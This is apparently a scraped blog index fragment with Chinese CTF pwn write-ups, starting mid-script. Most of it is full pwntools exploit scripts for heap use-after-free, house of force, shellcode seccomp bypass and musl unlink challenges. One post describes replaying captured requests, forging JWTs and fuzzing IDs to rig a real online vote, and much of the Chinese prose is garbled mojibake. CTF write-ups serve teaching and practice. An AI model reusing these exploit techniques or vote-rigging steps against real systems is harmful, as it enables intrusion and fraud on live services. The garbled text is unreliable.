p.recvuntil(b&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;What size cup:&quot;)    p.sendline(str(size))#0 &lt;= malloc &lt; 0x40    p.recvuntil(b&quot;Do you want something to add?&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;cup number: &#x27;)    p.sendline(str(index))#UAFdef edit(index,payload):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;which cup:&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;refill&quot;)    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def bd():    p.recvuntil(&#x27;--&gt;&gt;&gt;&gt; \\n&#x27;)    p.sendline(&#x27;888&#x27;)bd()add(0x38,&#x27;A&#x27;) # 0add(0x38,&#x27;B&#x27;) # 1delete(1)delete(0)show(0)heap_base = u64(data.ljust(8,b&#x27;\\x00&#x27;))(p.recv(6)) - 0x370edit(0,p64(heap_base + 0x10))pay = b&#x27;\\x00&#x27; * 0x0e + b&#x27;\\x07&#x27;add(0x38,&#x27;exp1&#x27;) # 2add(0x38,pay) # 3# exp 2add(0x38,&#x27;A&#x27;) # 4add(0x38,&#x27;B&#x27;) # 5delete(4)delete(5)edit(5,p64(heap_base + 0x2a0))add(0x38,&#x27;6&#x27;) # 6add(0x38,&#x27;7&#x27;) # 7delete(7)show(7)libc_base = uu64(r(6)) - 2018272__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]success(&#x27;heap_base:%s&#x27;,heap_base)success(&#x27;libc_base:%s&#x27;,libc_base)add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9delete(10)delete(11)edit(11,p64(__free_hook))add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,p64(system)) # 9delete(7)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"ycb_final_review","url":"/2023/09/16/ycb-offline-review/","content":"å‰ƒå¤´ï¼Œä»éœ€åŠªåŠ›ç‚¹å‡»ä¸‹è½½\neasy_forcechecksec\nâ””â”€$ checksec pwn[*] &#x27;/mnt/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\næœ¬åœ°debugä¸å¤§è¡Œhouse of forceæ‰“å®Œä¼šï¼š\n[DEBUG] Received 0x1d bytes:    b&#x27;malloc(): corrupted top size\\n&#x27;\nåªèƒ½å†™ä¸€æ¬¡\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_4007D6(a1, a2, a3);  puts(&quot;This day is schoolday,now teacher ask u to write somethings on the balckbroad&quot;);  puts(&quot;the teacher will leave some space on the balckbroad&quot;);  puts(&quot;u only give 4 times to reply&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_400961();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      sub_40093F();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        sub_400950();      &#125;      else if ( v3 == 4 )      &#123;        exit(1);      &#125;    &#125;    else if ( v3 == 1 )    &#123;      sub_400819();    &#125;  &#125;&#125;\naddå­˜åœ¨å †æº¢å‡ºæ²¡æœ‰å¯¹ç”³è¯·çš„sizeè¿›è¡Œæ£€æŸ¥\nunsigned __int64 sub_400819()&#123;  unsigned int v1; // [rsp+4h] [rbp-1Ch] BYREF  size_t v2; // [rsp+8h] [rbp-18h] BYREF  void *v3; // [rsp+10h] [rbp-10h]  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  puts(&quot;which index?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 4 || *(&amp;buf + (int)v1) )  &#123;    puts(&quot;already exist!&quot;);    exit(1);  &#125;  puts(&quot;how much space do u want?&quot;);  __isoc99_scanf(&quot;%ld&quot;, &amp;v2);  size[v1] = v2;  v3 = malloc(size[v1]);//æ— sizeæ£€æŸ¥  *(&amp;buf + (int)v1) = v3;  puts(&quot;now what to write?&quot;);  read(0, *(&amp;buf + (int)v1), 0x30uLL);//å­˜åœ¨å †æº¢å‡º  printf(&quot;the balckbroad on %p is in use\\n&quot;, *(&amp;buf + (int)v1));  return __readfsqword(0x28u) ^ v4;&#125;\næ‰“house of forceæ³„éœ²libc_base å’Œheap_baseæ‰“å®Œçš„å †ï¼š\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xa09000Size: 0x290 (with flag bits: 0x291)Allocated chunk | PREV_INUSEAddr: 0xa09290Size: 0x1010 (with flag bits: 0x1011)Allocated chunk | PREV_INUSEAddr: 0xa0a2a0Size: 0x20 (with flag bits: 0x21)Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0xa0a2c0Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)\n\nç„¶åæŠŠmalloc_gotæ”¹ä¸ºsystem\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10002)    def menu(idx):    p.sendlineafter(&#x27;away&#x27;, str(idx))def add(idx, size, data):    menu(1)    p.sendlineafter(&#x27;which index?&#x27;, str(idx))    p.sendlineafter(&#x27;space do u want?&#x27;, str(size))    p.sendafter(&#x27;what to write?&#x27;, data)add(0, 0x60000, b&#x27;\\n&#x27;)p.recvuntil(b&#x27;the balckbroad on &#x27;)libc_base = int(p.recvuntil(b&#x27; &#x27;), 16) - 0x58b010success(&#x27;libc_base:%s&#x27;, hex(libc_base))system = libc_base + libc.sym[&#x27;system&#x27;]payload = b&#x27;/bin/sh&#x27;.ljust(0x18, b&#x27;\\x00&#x27;) + p64(0xffffffffffffffff)add(1, 0x18, payload)p.recvuntil(b&#x27;the balckbroad on &#x27;)heap_base = int(p.recvuntil(b&#x27; &#x27;), 16)success(&#x27;heap_base:%s&#x27;,hex(heap_base))malloc_got = elf.got[&#x27;malloc&#x27;]top_chunk = heap_base + 0x10target_addr = malloc_got - 0x20 - top_chunkadd(2, target_addr, &#x27;\\n&#x27;)add(3, 0x18, p64(system) * 2)menu(1)p.sendlineafter(&#x27;which index?&#x27;, str(4))p.sendlineafter(&#x27;space do u want?&#x27;, str(heap_base))p.interactive()\n\narrary_index_bank\nâ””â”€$ checksec pwn1[*] &#x27;/mnt/ycbpwn/pwn1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\nsuper_aié‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œæ•°ç»„å…ƒç´ ä¸ºè´Ÿæ•°æ—¶å¯ä»¥æ³„éœ²æ•°æ®èµ›åœºä¸Šä¸çŸ¥é“æ³„éœ²çš„æ˜¯ä»€ä¹ˆç°åœ¨æ‰çŸ¥é“èƒ½æ³„éœ²ç¨‹åºåœ°å€\n__int64 super_ai()&#123;  __int64 v1[3]; // [rsp+0h] [rbp-30h] BYREF  __int64 v2; // [rsp+18h] [rbp-18h]  __int64 v3; // [rsp+20h] [rbp-10h]  __int64 v4; // [rsp+28h] [rbp-8h]  puts(&quot;Hi, welcome to Samman Fried-Bank!&quot;);  puts(&quot;We totally care about your money, give it all to us!!!!&quot;);  puts(&quot;We can go to the ~~moon~~ *cough* I mean we are totally regulated!&quot;);  v1[crypto_bro] = 384400LL;  v1[you] = 1000LL;  while ( 1 )  &#123;    while ( 1 )    &#123;      v1[you] -= rand() % 100;      if ( v1[you] &lt;= 0 )      &#123;        puts(&quot;sorry you are too poor bye! (overdraft fees sounds like a profitable idea hmmm....)&quot;);        return 1LL;      &#125;      menu(v1);      v4 = read_long();      if ( v4 != 1 )        break;      puts(&quot;Whose account?&quot;);      v3 = read_long();      if ( v3 &gt; you )      &#123;        puts(&quot;???&quot;);        exit(1);      &#125;      printf(&quot;accounts[%lld] = %lld\\n&quot;, v3, v1[v3]);    &#125;    if ( v4 != 2 )      break;    puts(&quot;Whose account?&quot;);    v3 = read_long();    if ( v3 &gt; you )    &#123;      puts(&quot;???&quot;);      exit(1);    &#125;    puts(&quot;How much?&quot;);    v2 = read_long();    v1[v3] = v2;    puts(&quot;Deposited! Your money is safe with us 100% guarenteed!&quot;);  &#125;  puts(&quot;Sorry, please be civil with our bank AIs, we haven&#x27;t figured ChatGPT yet.&quot;);  return 1LL;&#125;\nåç§»ä¸ä¼šç®—ï¼Œæœ€åä¹Ÿæ²¡æœ‰æ‰“é€šexpå­˜ç»™è‡ªå·±çœ‹äº†\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p = process(&#x27;./pwn1&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10000)    def debug(pro,bp):    gdb.attach(pro,str(bp))    pause()    def show(idx):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))def write(idx, data):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))   # 7 ret    p.sendlineafter(&#x27;How much?&#x27;, str(data))show(7)p.recvuntil(&#x27;] = &#x27;)codebase = int(p.recv(14), 10) - 0x151b #å¼€äº†pieï¼Œå¯ä»¥ç”¨åç§»æ¥æåœ°å€äº†success(&#x27;codebase:%s&#x27;, hex(codebase))#debug(p,&#x27;b *$rebase(0x14D2)&#x27;)backdoor = codebase + 0x1315write(7, backdoor)p.sendlineafter(&#x27;You current have&#x27;, &#x27;3&#x27;)p.interactive()\n\næœ‰ç©ºæ¥ç€å†™break&amp;fixï¼ŒæŒ–å¤§å‘\n","categories":["wp"]},{"title":"ä¸€æ¬¡åˆ·åˆ†å¤±è´¥çš„æ¸—é€","url":"/2025/04/24/%E4%B8%80%E6%AC%A1%E5%88%B7%E5%88%86%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%B8%97%E9%80%8F/","content":"è¿™ä¹ˆèƒ½åˆ·ï¼Ÿå…­ç™¾å…­åå…­ï¼Œç›éƒ½ä¸è¢‹ç›äº†å¿…é¡»ç‹ ç‹ åœ°å¼€åˆ·\næŠ“åŒ…åªèƒ½åœ¨å¾®ä¿¡å†…ç½®æµè§ˆå™¨è®¿é—®è¿™å¯ä¸è¡Œï¼Œä½¿ç”¨fiddlerè¿›è¡ŒæŠ“åŒ…æ…¢æ…¢æ‰¾æ‰¾åˆ°æŠ•ç¥¨çš„åŒ…ä¿å­˜è¯·æ±‚åŒ…ä»¥ä¾¿åé¢é‡æ”¾ï¼š\nè§£å¯†ï¼Ÿaiä¸€çœ¼ä¸çœŸé‰´å®šä¸ºjwtåŠ å¯†çš„tokenï¼Œé©¬ä¸Šè§£å¯†çœ‹çœ‹https://www.json.cn/jwtå“‡è´å¾·é£Ÿæ³¥é¸­ï¼Œå¯æƒœæ²¡å¾—HS256çš„å¯†é’¥ï¼Œä¼°è®¡æ˜¯è§£ä¸å›å»https://www.cnblogs.com/wafulo/p/18740245ç»™å®ƒä¸€ä¸ªé¢å­ï¼Œçˆ†çˆ†needyakitè§£ä¸å‡ºæ¥ä¹Ÿèƒ½æ”¾è¿›yakité‡Œç©ï¼Œææçƒ­åŠ è½½\nts = func(s) &#123; return timestamp()&#125;//æµ‹è¯•æ—¶é—´æˆ³sign = func(p) &#123;    key = `json.cn` // ç”¨äºHMACåŠ å¯†çš„å¯†é’¥ï¼Œè¿™é‡ŒæœªçŸ¥    // JWTå¤´ä¿¡æ¯    header = &#123;        &quot;alg&quot;: &quot;HS256&quot;,        &quot;typ&quot;: &quot;JWT&quot;    &#125;    // JWTè½½è·ä¿¡æ¯    payload = &#123;        &quot;iss&quot;: &quot;http://0920.8.51hm8111777.taevuin34.cn/app/auth/5028579&quot;,        &quot;iat&quot;: timestamp(),//å½“å‰æ—¶é—´æˆ³        &quot;exp&quot;: (timestamp()+800000),//è¿‡æœŸæ—¶é—´        &quot;nbf&quot;: timestamp(),        &quot;jti&quot;: &quot;EEuDOyeKjC3LiaJy&quot;,        &quot;sub&quot;: 5028579,        &quot;prv&quot;: &quot;5893efe178fbb4eafb984d3196077c3441224363&quot;,        &quot;appid&quot;: &quot;wxf6c0e8797c3bc2b5&quot;,        &quot;guard&quot;: &quot;app&quot;    &#125;    // ç”ŸæˆJWT    jwtHeader = codec.EncodeBase64Url(json.dumps(header))    jwtPayload = codec.EncodeBase64Url(json.dumps(payload))    jwtData = f`$&#123;jwtHeader&#125;.$&#123;jwtPayload&#125;`    jwtSignature = codec.EncodeBase64Url(codec.HmacSha256(key, jwtData))    jwtToken = f`$&#123;jwtData&#125;.$&#123;jwtSignature&#125;`    return jwtToken&#125;\né˜¿é‡Œå˜å¤šçƒ­åŠ è½½æ¡‘ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨webfuzzerå¹²å®ƒäº†å¤ªå¥½äº†æ˜¯æ•°å­—ç­¾åç®—æ³•ï¼Œæˆ‘ä»¬æ²¡æ•‘äº†\nPOST /api HTTP/1.1Host: example.comConnection: keep-aliveContent-Length: 25Accept: application/json, text/plain, */*X-Requested-With: XMLHttpRequestAuthorization: Bearer &#123;&#123;yak(sign)&#125;&#125;User-Agent: ?Origin: example.comAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9&#123;&quot;player ids&quot;:[&quot;&#123;&#123;int(0-65535)&#125;&#125;&quot;]&#125;\n\nå…¶ä»–å‘ç°åœ¨åˆ—æ’åçš„æ—¶å€™å‘ç°èƒ½æ‹¿åˆ°æ‰€æœ‰äººçš„idä½¿ç”¨yakitè‡ªå¸¦çš„æå–å™¨è¿›è¡Œidæå–ç„¶åæ·»åŠ åˆ°fuzztagå®ç°æœ‹å‹å«ä½ å¸®å¿™æŠ•ç¥¨çš„æ—¶å€™ç»™æ‰€æœ‰äººæŠ•ç¥¨ï¼‰æ€»ç»“æ²¡äº‹ç©ç©è¿™äº›è¿˜æ˜¯æŒºå¥½ç©çš„ï¼Œå°±æ˜¯ç°åœ¨ç¯å¢ƒè¶Šæ¥è¶Šå¥½äº†ï¼ŒçœŸæ‰“ä¸è¿›å»\n","tags":["web"]},{"title":"ç¾ŠåŸæ¯2023åˆèµ›_pwn_å¤ç°","url":"/2023/09/05/ycbCTF-pwn-review/","content":"è¿™æ¬¡ç¾ŠåŸæ¯è§è¯†æ¶¨äº†ä¸å°‘å¤ç°å®Œï¼Œåº”è¯¥èƒ½å¤Ÿçª¥è§å¤©æ‰æ®¿å ‚çš„ä¸€è§’äº†å§â€¦2023-ç¾ŠåŸæ¯-é¢˜ç›®é™„ä»¶risky-loginrisc-vçš„é¢˜ç¬¬ä¸€æ¬¡çœ‹tnnd,æåŠå¤©ç¯å¢ƒä¸å¦‚ç”¨ghidra\nundefined8 FUN_123457ea(void)&#123;  undefined auStack_130 [288];    gp = &amp;__global_pointer$;  FUN_123456a0();  puts(&quot;RiskY LoG1N SySTem&quot;);  puts(&quot;Input ur name:&quot;);  read(0,&amp;DAT_12347078,8);  printf(&quot;Hello, %s&quot;);  puts(&quot;Input ur words&quot;);  read(0,auStack_130,0x120);  FUN_12345786(auStack_130);  puts(&quot;message received&quot;);  return 0;&#125;\n\nvoid FUN_12345786(char *param_1)&#123;  size_t sVar1;  char acStack_108 [248];    gp = &amp;__global_pointer$;  sVar1 = strlen(param_1);  DAT_12347070 = (byte)sVar1; //æº¢å‡º  if (8 &lt; DAT_12347070) &#123;    puts(&quot;too long.&quot;);                    /* WARNING: Subroutine does not return */    exit(-1);  &#125;  strcpy(acStack_108,param_1);  return;&#125;\næº¢å‡ºç‚¹åœ¨è¿™é‡Œï¼Œå¼ºè¡Œè½¬æ¢ä¸ºbyteç±»å‹åä¼šé€ æˆ16ä¸ªå­—èŠ‚çš„æº¢å‡º\nvoid FUN_123456ee(void)&#123;  char *pcVar1;    gp = &amp;__global_pointer$;  puts(&quot;background debug fun.&quot;);  puts(&quot;input what you want exec&quot;);  read(0,&amp;DAT_12347078,8);  pcVar1 = strstr(&amp;DAT_12347078,&quot;sh&quot;);  if ((pcVar1 == (char *)0x0) &amp;&amp; (pcVar1 = strstr(&amp;DAT_12347078,&quot;flag&quot;), pcVar1 == (char *)0x0)) &#123;    system(&amp;DAT_12347078);    return;  &#125;  puts(&quot;no.&quot;);                    /* WARNING: Subroutine does not return */  exit(-1);&#125;\nè¿™ä¸ªæ˜¯åé—¨å‡½æ•°ï¼Œbanæ‰äº†â€shâ€å’Œâ€flagâ€ï¼Œå¯ä»¥é€šè¿‡cat f*æ¥ç»•è¿‡\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,29560)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context(log_level=&#x27;debug&#x27;)system = 0x0000000000010760p.recvuntil(b&quot;Input ur name:&quot;)p.send(b&#x27;0&#x27;*8)p.recvuntil(b&quot;Input ur words&quot;)p.send(b&#x27;1&#x27;*0x100+p64(0x0000000123456EE))p.sendline(b&#x27;cat f*&#x27;)p.interactive()\n\nshellcodeå¯ä»¥æ‰§è¡Œé•¿åº¦ä¸º 0x10 å­—èŠ‚çš„ shellcodeï¼Œshellcode æŒ‡ä»¤åªèƒ½ä¸º pop&#x2F;push &lt;å¯„å­˜å™¨&gt;ã€‚\nè§£é¢˜çš„å…³é”®ç‚¹æœ‰ä¸¤ä¸ªï¼š(1) shellcode åœ°å€ä½äºæ ˆä¸Šï¼›(2) å¼€å¤´å¯ä»¥å†™ä»»æ„ 2 å­—èŠ‚æ•°æ®åˆ°æ ˆä¸Šï¼ˆä¹Ÿå°±æ˜¯é‚£ä¸ª â€œ[2] Input: (ye &#x2F; no)â€ï¼‰ã€‚\nè§£é¢˜æ€è·¯æ˜¯å…ˆå°† 2 å­—èŠ‚çš„ syscall æ±‡ç¼–æŒ‡ä»¤ç ï¼ˆ\\x0f\\x05ï¼‰å†™åˆ°æ ˆä¸Šï¼Œç„¶ååˆ©ç”¨ pop&#x2F;push æŒ‡ä»¤å°†æŒ‡ä»¤ç å¤åˆ¶åˆ° shellcode å†…å­˜æœ«å°¾ï¼Œå¹¶å¸ƒç½®å¥½å¯„å­˜å™¨ï¼Œæœ€åè°ƒç”¨ read ç³»ç»Ÿè°ƒç”¨è¯»å…¥ cat flag shellcode åˆ° shellcode å†…å­˜ä¸Šã€‚\næ ˆä¸Šæœ‰ä¸€ä¸ªç¼“å†²åŒºåœ°å€æ°å¥½æŒ‡å‘æˆ‘ä»¬è¾“å…¥çš„ syscall æŒ‡ä»¤ç ï¼Œå¯ä»¥æŠŠè¿™ä¸ªç¼“å†²åŒºåœ°å€ pop åˆ° rspï¼Œå°† syscall æŒ‡ä»¤ç  pop åˆ°æŸä¸ªå¯„å­˜å™¨åï¼Œå†æ¬¡åˆ©ç”¨ pop&#x2F;push æŒ‡ä»¤å°† rsp æ”¹æˆäº‹å…ˆä¿å­˜å¥½çš„ shellcode å†…å­˜åœ°å€ï¼Œæœ€ååˆ©ç”¨ pop æŒ‡ä»¤å°† syscall æŒ‡ä»¤ç å†™åˆ° shellcode å†…å­˜åœ°å€ä¸Šå³å¯ã€‚\næ‰§è¡Œ shellcode å‰åŠ è½½äº† seccomp æ²™ç›’ï¼Œåªèƒ½è°ƒç”¨ open, write, read å’Œ dup2 ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶é™åˆ¶ read å’Œ write fd å‚æ•°çš„èŒƒå›´ï¼ˆread é™åˆ¶ fd &lt;&#x3D;2ã€write é™åˆ¶ fd &gt;2ï¼‰ã€‚ fd é™åˆ¶å¯ä»¥åˆ©ç”¨ dup2 é‡å®šå‘ fd æ¥ç»•è¿‡ã€‚\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;tcp.cloud.dasctf.com&quot;, 27135)p.sendafter(&quot;[2] Input: (ye / no)&quot;, b&quot;\\x0f\\x05&quot;) sc1 = asm(&quot;&quot;&quot;push raxpop rsipush rbxpop raxpush rbxpop rdipop rbxpop rbxpop rsppop rdxpush rsipop rsppop rbxpop rbxpop rbxpush rdxpush rdx&quot;&quot;&quot;)p.sendafter(&quot;[5] ======== Input Your P0P Code ========&quot;, sc1)sc2 = &quot;nop\\n&quot;*0x12sc2 += &quot;&quot;&quot;mov rsp, r12mov rax, 0x67616c662fpush raxmov rdi, rspmov rsi, 0mov rax, 2syscallmov rdi, raxmov rsi, 0mov rax, 33syscallmov rdi, 1mov rsi, 23mov rax, 33syscallmov rdi, 0mov rsi, rspmov rdx, 0x100mov rax, 0syscallmov rdi, 23mov rax, 1syscall&quot;&quot;&quot;p.send(asm(sc2))p.interactive()\n\ncookieBoxå…ˆè´´ç¯‡æ–‡ç« https://www.anquanke.com/post/id/202253#h3-12å¾ˆè¯¦ç»†ï¼Œçœ‹å®Œæ¥çœ‹é¢˜\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  char *v3; // rdx  const char *v4; // rdi  char v5[256]; // [rsp+10h] [rbp-110h] BYREF  _QWORD v6[2]; // [rsp+110h] [rbp-10h] BYREF  v6[1] = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  v3 = v5;  memset(v5, 0, sizeof(v5));  v4 = (const char *)v6;  while ( 1 )  &#123;    sub_400CE8(v4, 0LL, v3);    switch ( (unsigned int)sub_400980() )    &#123;      case 1u:        sub_400A50();        break;      case 2u:        sub_400B69();        break;      case 3u:        sub_400C59();        break;      case 4u:        sub_400BE1();        break;      case 5u:        exit(0);      default:        v4 = &quot;invalid choice&quot;;        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\nå¸¸è§„èœå•é¢˜ï¼Œå¢åˆ æ”¹æŸ¥\nint sub_400C59()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input the idx:&quot;);  v1 = sub_400980();  if ( v1 &lt;= 0xF &amp;&amp; (&amp;buf)[v1] &amp;&amp; *((_DWORD *)&amp;nbytes + v1) )  &#123;    puts(&quot;Please input the content:&quot;);    read(0, (&amp;buf)[v1], *((unsigned int *)&amp;nbytes + v1));    puts(&quot;Done&quot;);  &#125;  return puts(&quot;Idx Error&quot;);&#125;\nfreeä¹‹åæ²¡æœ‰æŠŠæŒ‡é’ˆæ¸…ç©ºï¼Œå­˜åœ¨UAF\nç¬¬ä¸€æ­¥æ³„æ¼ libc åŸºå€ï¼Œmusl-libc æŠŠç¨‹åºå†…å­˜æˆ–è€… libc å†…å­˜çš„ç©ºé—²å†…å­˜åˆ’ä¸ºå †å†…å­˜ï¼Œè€—å°½åæ‰ä¼šç”³è¯·åŠ¨æ€å†…å­˜ã€‚æ³„éœ²å †åœ°å€å°±å¯ä»¥å¾—åˆ°ç¨‹åºåŸºå€æˆ– libc åŸºå€\nleak ä¹‹åå¯ä»¥åˆ©ç”¨ unbin è¿›è¡Œunlinkï¼Œunbin æ²¡æœ‰æ£€æŸ¥prevå’ŒnextæŒ‡é’ˆæ˜¯å¦åˆæ³•ï¼Œé€šè¿‡å †æº¢å‡ºæˆ‘ä»¬å¯ä»¥æ”¹å†™è¿™ä¸¤ä¸ªæŒ‡é’ˆï¼Œåˆ©ç”¨ unbin å‘ä»»æ„åœ°å€å†™æŒ‡é’ˆåœ°å€ï¼Œå³*(uint64_t*)(prev + 2) &#x3D; nextå’Œ*(uint64_t*)(next + 3) &#x3D; prevã€‚\nå¯ä»¥å°† prevæ”¹æˆ io(stdin stdout)ï¼Œç„¶åæŠŠ nextæ”¹æˆ bssåœ°å€ï¼Œç„¶åç”³è¯·ä¸€ä¸ª chunk 0x100ï¼Œå°±å¯ä»¥å®ç°å°†ä»»æ„åœ°å€å†™å…¥ bss åœ°å€ï¼Œç„¶åå†ç”³è¯·ï¼Œå³å¯ä»»æ„ç”³è¯·ioå†™ioï¼Œç„¶åæ”¹ioä¸º binsh æ‰“systemå³å¯\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;cookieBox&#x27;)libc = ELF(&#x27;libc.so&#x27;)p = process(&#x27;./cookieBox&#x27;)#p = remote(&#x27;tcp.cloud.dasctf.com&#x27;, 25633)def debug():    gdb.attach(p)     pause()    def add(size, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size:\\n&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Content:\\n&quot;)    p.send(payload)def free(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;2&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))def edit(idx, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;3&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))    p.recvuntil(&quot;content:\\n&quot;)    p.send(payload)def show(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;4&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))add(0x100, b&#x27;a&#x27;*8)  #chunk0add(0x100, b&#x27;a&#x27;*8)  #chunk1add(0x100, b&#x27;a&#x27;*8)  #chunk2add(0x100, b&#x27;a&#x27;*8)  #chunk3show(0)p.recv(8)libc.address = u64(p.recvuntil(b&quot;\\x7f&quot;).ljust(0x8,b&quot;\\x00&quot;)) - 0x292e50success(&quot;libc.address--&gt;&quot;+hex(libc.address))    #leak_libc_basestdin = libc.address + 0x292200success(&quot;stdin--&gt;&quot;+hex(stdin))system = libc.sym[&#x27;system&#x27;]success(&quot;system--&gt;&quot;+hex(system))bss = 0x602060free(1)add(0x100, b&#x27;1&#x27;)  #chunk4free(1)           #double_free chunk1edit(4, p64(stdin) + p64(0x602070-0x10)) #bss_addr#debug()add(0x100, b&quot;A&quot;)  #chunk5,fake_chunkpayload = b&quot;/bin/sh\\x00&quot;payload += b&#x27;A&#x27; * 0x20payload += p64(0x22222222) # stdin -&gt; wpos -&gt; stdin -&gt; wbasepayload += b&#x27;A&#x27; * 8payload += p64(0x11111111)payload += b&#x27;A&#x27; * 8payload += p64(system)edit(2, payload)p.recvuntil(&quot;&gt;&gt;&quot;)p.sendline(&quot;5&quot;)p.interactive()\n\neasy_vm\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  puts(&quot;It&#x27;s a easy vmpwn,enjoy it&quot;);  ptr = malloc(0x1000uLL);  malloc(0x20uLL);  free(ptr);//è¿›å…¥unsortedbinï¼Œå…¶ fdã€bk æŒ‡é’ˆæŒ‡å‘ main_arena+88 çš„ä½ç½®ï¼ˆç¬¬ä¸€ä¸ªè¿›å…¥unsortedbinçš„chunkçš„æ€§è´¨ï¼‰,å¯ä»¥æ³„éœ²libc  ptr = 0LL;  qword_201040 = (__int64)malloc(0x1000uLL);  buf = malloc(0x1000uLL);     puts(&quot;Inputs your code:&quot;);  read(0, buf, 0x1000uLL);  while ( *(_BYTE *)buf )  &#123;    switch ( *(_BYTE *)buf )    &#123;      case 1:        qword_201040 += 8LL;        *(_QWORD *)qword_201040 = qword_201038; //ä¿å­˜201038çš„å†…å®¹        buf = (char *)buf + 8;        break;      case 2:        qword_201038 = *(_QWORD *)qword_201040;        qword_201040 -= 8LL;        buf = (char *)buf + 8;        break;      case 3:        *(_QWORD *)qword_201038 = *(_QWORD *)qword_201040;//èµ‹å€¼ï¼Œå°†201040é‡Œçš„å†…å®¹èµ‹ç»™201038        buf = (char *)buf + 8;        break;      case 4:        qword_201038 ^= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 5:        qword_201038 = *(_QWORD *)qword_201038;        buf = (char *)buf + 8;        break;      case 6:        qword_201038 += *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 7:                                             qword_201038 -= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;        //case6 case7å¯ä»¥å®ç°è°ƒåç§»      default:        buf = (char *)buf + 8;        break;    &#125;  &#125;  exit(0);&#125;\none_gadget\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, 